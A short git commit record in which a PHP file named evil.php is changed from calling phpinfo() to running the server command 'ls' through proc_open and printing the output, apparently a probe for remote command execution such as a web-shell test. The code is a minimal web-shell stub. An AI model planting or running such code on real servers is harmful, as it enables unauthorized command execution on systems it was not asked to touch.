072303090d9952070cc7a4668629cc424574096e
0xGabe <68028935+0xGabe@users.noreply.github.com>
2024-12-02 00:29:35 -0300

    Update evil.php

--- evil.php
+++ evil.php
@@ -1,3 +1,13 @@
 <?php
     echo "randosndoafasfaasda";
-    phpinfo();
+    $descriptorspec = array(
+    0 => array("pipe", "r"),  // stdin
+    1 => array("pipe", "w"),  // stdout
+    2 => array("pipe", "w")   // stderr
+);
+$process = proc_open('ls', $descriptorspec, $pipes);
+if (is_resource($process)) {
+    echo stream_get_contents($pipes[1]);
+    fclose($pipes[1]);
+    proc_close($process);
+}
